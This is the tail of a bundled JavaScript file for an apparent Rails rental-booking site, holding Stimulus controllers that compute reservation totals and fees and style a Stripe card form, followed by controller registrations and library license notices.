        if (!isEmpty_default(this.checkoutTarget.value)) {
          this.updateNightlyTotal();
        }
      });
      this.checkoutTarget.addEventListener("changeDate", (e) => {
        const date = new Date(e.target.value);
        date.setDate(date.getDate() - 1);
        this.checkinPicker.setOptions({
          maxDate: date
        });
        if (!isEmpty_default(this.checkinTarget.value)) {
          this.updateNightlyTotal();
        }
      });
    }
    numberOfNights() {
      let checkinDate = new Date(this.checkinTarget.value);
      let checkoutDate = new Date(this.checkoutTarget.value);
      return (checkoutDate - checkinDate) / (1e3 * 60 * 60 * 24);
    }
    calculateNightlyTotal() {
      return (this.numberOfNights() * this.element.dataset.nightlyPrice).toFixed(2);
    }
    updateNightlyTotal() {
      this.numOfNightsTarget.textContent = this.numberOfNights();
      this.nightlyTotalTarget.textContent = this.calculateNightlyTotal();
      this.updateServiceFee();
    }
    calculateServiceFee() {
      return (this.calculateNightlyTotal() * this.element.dataset.serviceFee).toFixed(2);
    }
    updateServiceFee() {
      this.serviceFeeTarget.textContent = this.calculateServiceFee();
      this.updateTotal();
    }
    calculateTotal() {
      return (parseFloat(this.calculateNightlyTotal()) + parseFloat(this.element.dataset.cleaningFee) + parseFloat(this.calculateServiceFee())).toFixed(2);
    }
    updateTotal() {
      this.totalTarget.textContent = this.calculateTotal();
    }
    buildReservationParams() {
      let params = {
        checkin_date: this.checkinTarget.value,
        checkout_date: this.checkoutTarget.value,
        subtotal: this.nightlyTotalTarget.textContent,
        cleaning_fee: this.element.dataset.cleaningFee,
        service_fee: this.serviceFeeTarget.textContent,
        total: this.totalTarget.textContent
      };
      return new URLSearchParams(params).toString();
    }
    buildSubmitUrl(url) {
      return `${url}?${this.buildReservationParams()}`;
    }
    submitReservationComponent(e) {
      if (isEmpty_default(this.checkinTarget.value) || isEmpty_default(this.checkoutTarget.value)) {
        import_sweetalert2.default.fire({
          icon: "error",
          text: "Please select both the checking and the checkout dates"
        });
      } else {
        Turbo.visit(this.buildSubmitUrl(e.target.dataset.submitUrl));
      }
    }
  };

  // app/javascript/controllers/stripe_elements_controller.js
  var stripe_elements_controller_default = class extends Controller {
    submitButtonClass = "mt-4 w-full rounded-md border border-transparent bg-indigo-600 px-4 py-3 text-base font-medium text-white shadow-sm hover:bg-indigo-700 focus:outline-none focus:ring-2 focus:ring-indigo-500 focus:ring-offset-2 focus:ring-offset-gray-50 cursor-pointer";
    connect() {
      this.getStripeFormLabel().classList.add("hidden");
      this.getStripeSubmitButton().className += this.submitButtonClass;
    }
    getStripeCardElement() {
      return document.getElementById("card-element");
    }
    getStripeSubmitButton() {
      return document.querySelector("#stripe-form input[type='submit']");
    }
    getStripeFormLabel() {
      return document.querySelector("label[for='card_element']");
    }
  };

  // app/javascript/controllers/index.js
  application.register("favorites", favorites_controller_default);
  application.register("geolocation", geolocation_controller_default);
  application.register("header", header_controller_default);
  application.register("modal", modal_controller_default);
  application.register("share", share_controller_default);
  application.register("users-by-email-auth", users_by_email_auth_controller_default);
  application.register("share-modal", share_modal_controller_default);
  application.register("property", property_controller_default);
  application.register("reservation-component", reservation_component_controller_default);
  application.register("stripe-elements", stripe_elements_controller_default);

  // app/javascript/application.js
  var import_flowbite_turbo = __toESM(require_flowbite_turbo());
})();
/*! Bundled license information:

sweetalert2/dist/sweetalert2.all.js:
  (*!
  * sweetalert2 v11.10.5
  * Released under the MIT License.
  *)

@hotwired/turbo/dist/turbo.es2017-esm.js:
  (*!
  Turbo 8.0.0-beta.2
  Copyright © 2023 37signals LLC
   *)

lodash-es/lodash.js:
  (**
   * @license
   * Lodash (Custom Build) <https://lodash.com/>
   * Build: `lodash modularize exports="es" -o ./`
   * Copyright OpenJS Foundation and other contributors <https://openjsf.org/>
   * Released under MIT license <https://lodash.com/license>
   * Based on Underscore.js 1.8.3 <http://underscorejs.org/LICENSE>
   * Copyright Jeremy Ashkenas, DocumentCloud and Investigative Reporters & Editors
   *)
*/
//# sourceMappingURL=/assets/application.js.map
